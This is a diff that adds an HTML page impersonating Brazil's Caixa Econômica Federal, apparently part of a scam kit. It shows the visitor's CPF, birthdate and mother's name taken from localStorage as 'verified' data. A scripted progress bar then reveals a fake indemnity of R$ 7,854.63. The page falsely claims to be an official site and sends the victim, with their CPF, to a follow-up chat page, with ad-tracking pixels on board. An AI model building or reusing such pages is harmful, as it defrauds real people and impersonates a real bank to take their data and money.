@@ -1,0 +1,828 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+<script>
+  window.pixelId = "67ef67b0655738af4b8dbdd8";
+var a = document.createElement("script");
+a.setAttribute("async", "");
+a.setAttribute("defer", "");
+a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+document.head.appendChild(a);
+</script>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2853456888176959');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2853456888176959&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+<script
+  src="https://otimizey-cdn.s3.us-east-1.amazonaws.com/scripts-utm-otimizey.js"
+  async
+  defer
+></script>;
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Consulta de Indenização - Caixa Econômica Federal</title>
+  <link rel="icon" href="../images/icons/favicon-caixa.ico" type="image/x-icon">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com"></script>
+  
+  <style>
+    :root {
+      --azul-caixa: #005CA9;
+      --azul-caixa-escuro: #004a87;
+      --laranja-caixa: #F39200;
+      --laranja-caixa-escuro: #e08600;
+      --cinza-claro: #F5F5F5;
+      --cinza-medio: #E0E0E0;
+      --cinza-escuro: #717171;
+      --verde-progresso: #00A651;
+    }
+    
+    * {
+      font-family: 'Roboto', Arial, Helvetica, sans-serif !important;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Roboto', Arial, Helvetica, sans-serif;
+      background-color: #f2f2f2;
+      color: #333;
+      line-height: 1.6;
+    }
+    
+    input, input:focus {
+      box-shadow: none !important;
+      outline: none !important;
+    }
+    
+    input:focus {
+      border-color: var(--azul-caixa) !important;
+      border-width: 0 0 2px !important;
+    }
+    
+    /* Estilos para barra de progresso de carregamento */
+    .progress-bar {
+      transition: width 0.5s linear;
+    }
+    
+    /* Estilos para o player de vídeo */
+    .video-container {
+      position: relative;
+      overflow: hidden;
+      width: 100%;
+      height: 214px;
+      border-radius: 6px;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+    }
+    
+    /* Animação de pulsação para o botão */
+    @keyframes pulse {
+      0% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.05);
+      }
+      100% {
+        transform: scale(1);
+      }
+    }
+    
+    .custom-pulse-animation {
+      animation: pulse 1.5s infinite ease-in-out;
+    }
+    
+    .animate-pulse {
+      animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+    }
+
+    /* Thumbnail overlay */
+    .video-thumbnail {
+      position: absolute;
+      inset: 0;
+      background-color: rgba(0, 0, 0, 0.5);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      z-index: 10;
+      border-radius: 6px;
+    }
+    
+    /* Botão de Play personalizado */
+    .play-button {
+      border-radius: 12px;
+      width: 250px;
+      height: 250px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* Estilos específicos do governo */
+    .gov-card {
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      border: 1px solid var(--cinza-medio);
+    }
+    
+    .gov-header {
+      background: linear-gradient(to right, var(--azul-caixa), var(--azul-caixa-escuro));
+      border-bottom: 1px solid var(--cinza-medio);
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
+    
+    .gov-title {
+      color: var(--azul-caixa);
+      font-weight: 600;
+      font-size: 1.2rem;
+      line-height: 1.4;
+    }
+    
+    .gov-subtitle {
+      color: var(--cinza-escuro);
+      font-size: 0.95rem;
+    }
+    
+    .gov-section-title {
+      color: var(--azul-caixa);
+      font-weight: 600;
+      font-size: 1rem;
+      border-left: 4px solid var(--laranja-caixa);
+      padding-left: 10px;
+    }
+    
+    .gov-info-row {
+      display: flex;
+      align-items: center;
+      padding: 10px;
+      border-bottom: 1px solid #f0f0f0;
+    }
+    
+    .gov-info-row:last-child {
+      border-bottom: none;
+    }
+    
+    .gov-info-label {
+      font-weight: 600;
+      color: var(--azul-caixa);
+      margin-right: 5px;
+    }
+    
+    .gov-button {
+      background-color: var(--laranja-caixa);
+      color: white;
+      font-weight: 600;
+      border: none;
+      border-radius: 4px;
+      padding: 12px 20px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background-color 0.2s, transform 0.2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    .gov-button:hover {
+      background-color: var(--laranja-caixa-escuro);
+      transform: translateY(-2px);
+    }
+    
+    .gov-button:active {
+      transform: translateY(0);
+    }
+    
+    .gov-footer {
+      background: linear-gradient(to right, var(--azul-caixa), var(--azul-caixa-escuro));
+      color: white;
+      font-size: 0.8rem;
+      text-align: center;
+      padding: 10px;
+    }
+    
+    .gov-progress-container {
+      background-color: #e6e6e6;
+      border-radius: 50px;
+      height: 8px;
+      overflow: hidden;
+    }
+    
+    .gov-progress-bar {
+      background: linear-gradient(to right, var(--verde-progresso), var(--laranja-caixa));
+      height: 100%;
+      border-radius: 50px;
+    }
+    
+    .gov-info-box {
+      background-color: #f9f9f9;
+      border: 1px solid #e0e0e0;
+      border-radius: 6px;
+      padding: 15px;
+    }
+    
+    .gov-info-icon {
+      width: 28px;
+      height: 28px;
+      padding: 5px;
+      background-color: rgba(0, 92, 169, 0.1);
+      border-radius: 50%;
+      margin-right: 10px;
+    }
+    
+    .gov-cert-seal {
+      position: absolute;
+      bottom: -10px;
+      right: 20px;
+      width: 80px;
+      height: 80px;
+      opacity: 0.8;
+    }
+
+    .official-stamp {
+      position: absolute;
+      top: -15px;
+      right: -15px;
+      background-color: var(--laranja-caixa);
+      color: white;
+      padding: 5px 15px;
+      border-radius: 4px;
+      transform: rotate(10deg);
+      font-size: 0.75rem;
+      font-weight: bold;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+      z-index: 10;
+    }
+
+    .official-bar {
+      background-color: var(--azul-caixa);
+      height: 5px;
+      width: 100%;
+    }
+    
+    .caixa-pill {
+      background-color: var(--azul-caixa);
+      color: white;
+      padding: 2px 8px;
+      border-radius: 12px;
+      font-size: 0.7rem;
+      font-weight: 500;
+      margin-left: 5px;
+    }
+
+    .shield-icon {
+      background-color: rgba(0, 92, 169, 0.1);
+      border-radius: 50%;
+      padding: 5px;
+      margin-right: 8px;
+    }
+    
+    /* Responsividade */
+    @media (max-width: 640px) {
+      .gov-title {
+        font-size: 1.1rem;
+      }
+      
+      .gov-subtitle {
+        font-size: 0.9rem;
+      }
+    }
+  </style>
+  
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            caixa: {
+              blue: '#005CA9',
+              orange: '#F39200',
+              darkblue: '#004a87',
+              lightgray: '#F5F5F5',
+              gray: '#717171'
+            }
+          },
+          fontFamily: {
+            sans: ['Roboto', 'Arial', 'Helvetica', 'sans-serif'],
+          }
+        }
+      }
+    }
+    
+    // Script para atualizar a barra de progresso
+    document.addEventListener('DOMContentLoaded', function() {
+      // Iniciar com valor muito baixo (quase não visível)
+      let progress = 0.5;
+      let progressInterval = null;
+      const progressBar = document.querySelector('.gov-progress-bar');
+      const progressPercentage = document.getElementById('progress-percentage');
+      const calculoTitle = document.querySelector('h1.gov-title');
+      const calculoDesc = document.querySelector('p.gov-subtitle');
+      const valorDisponivel = document.querySelector('#valor-disponivel');
+      const userName = document.getElementById('user-name');
+      let calculoConcluido = false;
+      let userName_value = '';
+      
+      // Duração em segundos (total que a barra levará para completar)
+      const progressDurationSeconds = 120;
+      
+      // Definir valores iniciais
+      progressBar.style.width = progress + '%';
+      progressPercentage.textContent = `${Math.round(progress)}%`;
+      
+      // Função para iniciar a progressão da barra
+      function startProgressBar() {
+        // Limpar intervalo anterior se existir
+        if (progressInterval) {
+          clearInterval(progressInterval);
+        }
+      
+        // Calcular o incremento necessário
+        const updateInterval = 500; // Meio segundo
+        const totalUpdates = (progressDurationSeconds * 1000) / updateInterval;
+        const incrementPerUpdate = (100 - progress) / totalUpdates;
+        
+        // Iniciar o intervalo para atualizar a barra de progresso
+        progressInterval = setInterval(() => {
+          progress += incrementPerUpdate;
+          
+          // Atualizar o texto da porcentagem
+          progressPercentage.textContent = `${Math.round(progress)}%`;
+          
+          if (progress >= 100) {
+            clearInterval(progressInterval);
+            progress = 100;
+            progressPercentage.textContent = "100%";
+            
+            // Quando a barra chegar a 100%, mudar os textos
+            if (!calculoConcluido) {
+              calculoConcluido = true;
+              
+              // Obter o nome do usuário
+              userName_value = userName.textContent || '';
+              
+              // Atualizar textos
+              if (calculoTitle) {
+                calculoTitle.innerHTML = `<span class="text-green-600">✓</span> ${userName_value}, sua indenização foi calculada`;
+              }
+              
+              if (calculoDesc) {
+                calculoDesc.textContent = 'Valor disponível para saque imediato. Para prosseguir com o recebimento, clique no botão abaixo.';
+              }
+              
+              const valorDisponivel = document.getElementById('valor-disponivel');
+              if (valorDisponivel) {
+                // Animar o valor de 0 até 7854.63
+                animateValue(valorDisponivel, 0, 7854.63, 2000);
+              }
+              
+              // Mostrar o botão de saque com animação
+              saqueButton.style.display = 'flex';
+              addPulseToButton();
+              
+              // Adicionar selo de autenticação
+              const card = document.querySelector('.gov-card');
+              if (card) {
+                const seal = document.createElement('img');
+              
+                seal.className = 'gov-cert-seal';
+                card.style.position = 'relative';
+                card.appendChild(seal);
+                
+                // Animar o selo
+                seal.animate([
+                  { opacity: 0, transform: 'scale(0.5) rotate(10deg)' },
+                  { opacity: 1, transform: 'scale(1) rotate(0deg)' }
+                ], {
+                  duration: 800,
+                  easing: 'ease-out',
+                  fill: 'forwards'
+                });
+              }
+            }
+          }
+          
+          progressBar.style.width = progress + '%';
+        }, updateInterval);
+      }
+      
+      // Encontrar o botão de saque que já está no HTML
+      const saqueButton = document.getElementById('saque-button');
+      
+      // Adicionar efeito de pulsação ao botão quando aparecer
+      function addPulseToButton() {
+        saqueButton.classList.add('animate-pulse');
+        setTimeout(() => {
+          saqueButton.classList.remove('animate-pulse');
+        }, 5000); // Pulsa por 5 segundos
+      }
+      
+      // Função para redirecionar para a página de chat
+      saqueButton.addEventListener('click', function() {
+        // Obter os parâmetros da URL atual
+        const urlParams = new URLSearchParams(window.location.search);
+        const cpf = urlParams.get('cpf') || '';
+        
+        // Criar a URL para a página de chat
+        const chatUrl = new URL('/consulta/chat', window.location.origin);
+        
+        // Adicionar CPF à URL
+        if (cpf) {
+          chatUrl.searchParams.set('cpf', cpf);
+        }
+        
+        // Copiar todos os parâmetros UTM existentes
+        for (const [key, value] of urlParams.entries()) {
+          if (key !== 'cpf') {  // Evitar duplicação do parâmetro CPF
+            chatUrl.searchParams.set(key, value);
+          }
+        }
+        
+        // Adicionar animação ao clicar
+        saqueButton.classList.add('scale-95');
+        saqueButton.innerHTML = 'Processando...';
+        
+        // Redirecionar para a página de chat após pequeno delay para a animação
+        setTimeout(() => {
+        window.location.href = chatUrl.toString();
+        }, 800);
+      });
+      
+      // Função para animar o valor da indenização
+      function animateValue(element, start, end, duration) {
+        let startTimestamp = null;
+        const step = (timestamp) => {
+          if (!startTimestamp) startTimestamp = timestamp;
+          const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+          const currentValue = Math.floor(progress * (end - start) + start);
+          element.textContent = `R$ ${currentValue.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 }).replace('.', ',')}`;
+          if (progress < 1) {
+            window.requestAnimationFrame(step);
+          }
+        };
+        window.requestAnimationFrame(step);
+      }
+      
+      // Iniciar o progresso imediatamente quando a página carregar
+      startProgressBar();
+      
+      // Carregar dados do usuário do localStorage
+      const userDataString = localStorage.getItem('userData');
+      
+      // Exibir log de todos os dados no localStorage
+      console.log('============ DADOS DO LOCALSTORAGE ============');
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        const value = localStorage.getItem(key);
+        console.log(`${key}:`, value);
+        
+        // Tentar converter para JSON para exibição mais organizada
+        try {
+          const jsonValue = JSON.parse(value);
+          console.log(`${key} (parsed):`, jsonValue);
+        } catch (e) {
+          // Não é JSON, ignora
+        }
+      }
+      console.log('==============================================');
+      
+      if (userDataString) {
+        try {
+          const userData = JSON.parse(userDataString);
+          console.log('Dados do usuário recuperados:', userData);
+          
+          // Preencher os dados nas seções correspondentes
+          document.getElementById('user-name').textContent = userData.nome || '';
+          document.getElementById('user-birthdate').textContent = userData.dataNascimento || '';
+          
+          // Formatar o CPF com pontos e traço (000.000.000-00)
+          const formatCPF = (cpf) => {
+            // Garantir que o CPF tenha 11 dígitos, removendo caracteres não numéricos
+            cpf = cpf.replace(/\D/g, '');
+            
+            if (cpf.length !== 11) {
+              return cpf; // Retorna o CPF original se não tiver 11 dígitos
+            }
+            
+            // Formatação: 000.000.000-00
+            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+          };
+          
+          document.getElementById('user-cpf').textContent = formatCPF(userData.cpf) || '';
+          document.getElementById('user-mother').textContent = userData.nomeMae || '';
+
+          // Atualizar o título da aba com o nome do usuário
+          document.title = `Consulta de Indenização - ${userData.nome} | Caixa`;
+        } catch (error) {
+          console.error('Erro ao carregar dados do usuário:', error);
+        }
+      } else {
+        console.warn('Nenhum dado de usuário encontrado no localStorage');
+      }
+    });
+
+    // Adiciona a data atual no formato brasileiro
+    document.addEventListener('DOMContentLoaded', function() {
+      const options = { day: '2-digit', month: '2-digit', year: 'numeric' };
+      const currentDate = new Date().toLocaleDateString('pt-BR', options);
+      document.getElementById('current-date').textContent = currentDate;
+    });
+  </script>
+</head>
+
+<body class="min-h-screen bg-gray-100">
+  <!-- Barra oficial superior -->
+  <div class="official-bar"></div>
+
+  <!-- Cabeçalho -->
+  <header class="bg-white py-4 px-4 mb-4 shadow-md border-b-2 border-caixa-blue">
+    <div class="max-w-[1200px] mx-auto flex items-center justify-between">
+      <div class="flex items-center">
+        <img alt="Logo Caixa" width="120" height="35" class="w-auto h-10" src="../images/logo-caixa.png">
+        <div class="h-8 w-px bg-gray-300 mx-4"></div>
+        <div class="text-gray-800">
+          <div class="text-sm font-semibold">Sistema de Consulta</div>
+          <div class="text-xs text-gray-600">Indenizações e Restituições</div>
+        </div>
+      </div>
+      <div class="hidden md:flex items-center text-gray-700 text-sm">
+        <div class="mr-6 flex items-center">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1 text-caixa-blue" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+          </svg>
+          Acesso Seguro
+        </div>
+        <div class="flex items-center">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1 text-caixa-blue" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
+          </svg>
+          <span id="current-date"></span>
+        </div>
+      </div>
+    </div>
+  </header>
+  
+  <div class="container mx-auto px-4 pb-8">
+    <div class="max-w-[800px] w-full mx-auto mb-6">
+      <!-- Caminho de navegação -->
+      <div class="flex items-center text-xs text-gray-600 mb-4">
+        <a href="../index.html" class="hover:text-caixa-blue">Início</a>
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-3 w-3 mx-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
+        </svg>
+        <span class="text-caixa-blue font-medium">Consulta de Indenização</span>
+          </div>
+          
+      <!-- Título da página -->
+ 
+      
+      <!-- Cartão principal -->
+      <div class="gov-card bg-white p-6 rounded-lg mb-4 relative">
+     
+        <h1 class="gov-title mb-2">Atenção, estamos calculando a sua indenização</h1>
+        <p class="gov-subtitle mb-4">Enquanto verificamos seu direito à indenização e realizamos os cálculos necessários, assista ao vídeo informativo abaixo.</p>
+        
+        <!-- Barra de progresso com rótulo -->
+        <div class="mb-1 flex justify-between items-center text-xs">
+          <span class="text-caixa-gray">Progresso da verificação</span>
+          <span class="text-caixa-blue font-medium" id="progress-percentage">0%</span>
+        </div>
+        <div class="gov-progress-container mb-6">
+          <div class="gov-progress-bar" style="width: 0.5%;"></div>
+            </div>
+        
+        <!-- Player de vídeo com borda oficial -->
+        <div class="w-full mb-6 border-2 border-caixa-blue rounded-lg overflow-hidden">
+          <div class="bg-caixa-blue text-white text-xs py-1 px-3 flex items-center">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" />
+            </svg>
+            Informativo Oficial Caixa Econômica Federal
+          </div>
+          <div class="relative w-full" style="padding: 0;">
+            <div style="position:relative;padding-top:56.25%;"><iframe id="panda-3ab2bd5f-f5aa-4993-b7a3-aea917e3c58f" src="https://player-vz-a32a7a2f-2c1.tv.pandavideo.com.br/embed/?v=3ab2bd5f-f5aa-4993-b7a3-aea917e3c58f" style="border:none;position:absolute;top:0;left:0;" allow="accelerometer;gyroscope;autoplay;encrypted-media;picture-in-picture" allowfullscreen=true width="100%" height="100%" fetchpriority="high"></iframe></div> 
+            
+        <!-- Botão de saque - inicialmente oculto -->
+        <button id="saque-button" class="gov-button w-full mb-6" style="display: none;">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" viewBox="0 0 20 20" fill="currentColor">
+            <path fill-rule="evenodd" d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z" clip-rule="evenodd" />
+          </svg>
+          Solicitar minha indenização
+        </button>
+        
+        <!-- Seção de dados do usuário com design melhorado -->
+      
+          
+          <div class="gov-info-box mb-4 rounded-lg overflow-hidden border-2 border-gray-200">
+            <div class="bg-gray-50 p-2 text-xs text-caixa-gray border-b border-gray-200 flex items-center">
+              <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1 text-caixa-blue" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4" />
+              </svg>
+              Sua conta Caixa foi identificada!
+            </div>
+            
+            <div class="grid grid-cols-1 gap-2 w-full">
+              <div class="flex flex-wrap items-center p-3 border-b border-gray-100">
+                <div class="flex items-center mr-2">
+                  <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-caixa-blue" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
+                  </svg>
+                </div>
+                <span class="font-medium text-caixa-blue mr-1">Nome Completo:</span>
+                <span class="text-gray-800 break-words flex-grow" id="user-name">Carregando...</span>
+              </div>
+              
+              <div class="flex flex-wrap items-center p-3 border-b border-gray-100">
+                <div class="flex items-center mr-2">
+                  <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-caixa-blue" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
+                  </svg>
+                </div>
+                <span class="font-medium text-caixa-blue mr-1">Data de Nascimento:</span>
+                <span class="text-gray-800 break-words flex-grow" id="user-birthdate">Carregando...</span>
+              </div>
+              
+              <div class="flex flex-wrap items-center p-3 border-b border-gray-100">
+                <div class="flex items-center mr-2">
+                  <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-caixa-blue" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2" />
+                  </svg>
+                </div>
+                <span class="font-medium text-caixa-blue mr-1">CPF:</span>
+                <span class="text-gray-800 break-words flex-grow" id="user-cpf">Carregando...</span>
+              </div>
+              
+              <div class="flex flex-wrap items-center p-3 border-b border-gray-100">
+                <div class="flex items-center mr-2">
+                  <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-caixa-blue" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197M13 7a4 4 0 11-8 0 4 4 0 018 0z" />
+                  </svg>
+                </div>
+                <span class="font-medium text-caixa-blue mr-1">Nome da Mãe:</span>
+                <span class="text-gray-800 break-words flex-grow" id="user-mother">Carregando...</span>
+            </div>
+            
+              <div class="flex flex-wrap items-center p-3 bg-blue-50">
+                <div class="flex items-center mr-2">
+                  <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-caixa-blue" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+                  </svg>
+                </div>
+                <span class="font-medium text-caixa-blue mr-1">Valor disponível:</span>
+                <span class="text-gray-800 break-words flex-grow font-semibold" id="valor-disponivel">Calculando a sua indenização financeira…</span>
+              </div>
+            </div>
+            </div>
+            
+          <!-- Selo de autenticidade -->
+          <div class="flex items-center justify-between mb-4">
+            <div class="bg-blue-50 border-l-4 border-caixa-blue p-3 text-sm text-gray-700 flex-grow mr-4">
+              <p class="flex items-center text-sm">
+                <svg class="h-5 w-5 text-caixa-blue mr-2" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
+                  <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd" />
+                </svg>
+                Os dados exibidos são verificados nos sistemas oficiais da Caixa Econômica Federal.
+              </p>
+            </div>
+            <div class="hidden md:block">
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <!-- Aviso de segurança com ícones de segurança -->
+     
+      
+      <!-- Perguntas frequentes - Informações Adicionais -->
+      <div class="bg-white p-4 rounded-lg mb-6">
+        <h2 class="text-caixa-blue font-semibold text-sm mb-3 flex items-center">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+          </svg>
+          Informações Adicionais
+        </h2>
+        <div class="text-sm text-gray-700 space-y-2">
+          <p>• Os valores de indenização são calculados com base nas normas vigentes da Caixa Econômica Federal.</p>
+          <p>• Após a confirmação, você receberá orientações para o recebimento dos valores.</p>
+      
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <!-- Rodapé -->
+  <footer class="bg-gradient-to-r from-caixa-blue to-caixa-darkblue text-white">
+    <!-- Barra superior do rodapé -->
+   
+    
+    <!-- Rodapé principal -->
+    <div class="py-4 px-4">
+      <div class="container mx-auto max-w-[1200px]">
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 items-center">
+          <div class="flex justify-center md:justify-start">
+         
+          </div>
+          
+          <div class="text-center text-xs">
+            <p class="mb-1">© Caixa Econômica Federal - Todos os direitos reservados</p>
+            <p>CNPJ: 00.360.305/0001-04 - Sistema de Consulta de Indenizações</p>
+          </div>
+          
+        
+        </div>
+        
+        <div class="border-t border-white border-opacity-20 mt-3 pt-3 text-center text-xs text-white text-opacity-70">
+          <p>Este é um site oficial da Caixa Econômica Federal</p>
+        
+          <div class="flex items-center justify-center mt-2">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+            </svg>
+            <span>Conexão segura via SSL - Seus dados estão protegidos</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Script para controle do vídeo - Removido por não ser mais necessário -->
+  <script>
+    // Animação de entrada para elementos principais
+    document.addEventListener('DOMContentLoaded', function() {
+      // Adicionar classes de animação
+      document.head.insertAdjacentHTML('beforeend', `
+        <style>
+          @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+          }
+          @keyframes fadeOut {
+            from { opacity: 1; }
+            to { opacity: 0; }
+          }
+          .animate-fadeIn {
+            animation: fadeIn 0.5s ease-out forwards;
+          }
+          .animate-fadeOut {
+            animation: fadeOut 0.5s ease-out forwards;
+          }
+          
+          /* Adicionar marca d'água oficial */
+          .official-watermark {
+            position: fixed;
+            bottom: 20%;
+            right: 5%;
+            opacity: 0.03;
+            z-index: -1;
+            pointer-events: none;
+            transform: rotate(-30deg);
+          }
+        </style>
+      `);
+
+      // Adicionar marca d'água oficial
+      const watermark = document.createElement('div');
+      watermark.className = 'official-watermark';
+      watermark.innerHTML = `
+        <img src="../images/logo-caixa.png" alt="Marca d'água Caixa" class="w-64 h-auto">
+      `;
+      document.body.appendChild(watermark);
+      
+      // Adicionar animação de entrada aos elementos principais
+      const mainElements = document.querySelectorAll('.gov-card, .gov-section-title, .gov-info-box');
+      mainElements.forEach((el, index) => {
+        el.style.opacity = '0';
+        setTimeout(() => {
+          el.classList.add('animate-fadeIn');
+        }, 100 * index);
+      });
+      
+      // Adicionar indicador de site oficial ao título
+      const pageTitle = document.querySelector('.text-xl.font-bold.text-caixa-blue');
+      if (pageTitle) {
+        const officialBadge = document.createElement('span');
+        officialBadge.className = 'ml-2 inline-flex items-center px-2 py-0.5 rounded text-xs font-medium bg-green-100 text-green-800';
+        officialBadge.innerHTML = `
+          <svg class="h-3 w-3 mr-1" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
+          </svg>
+          Oficial
+        `;
+        pageTitle.appendChild(officialBadge);
+      }
+    });
+  </script>
+</body>
+</html> 
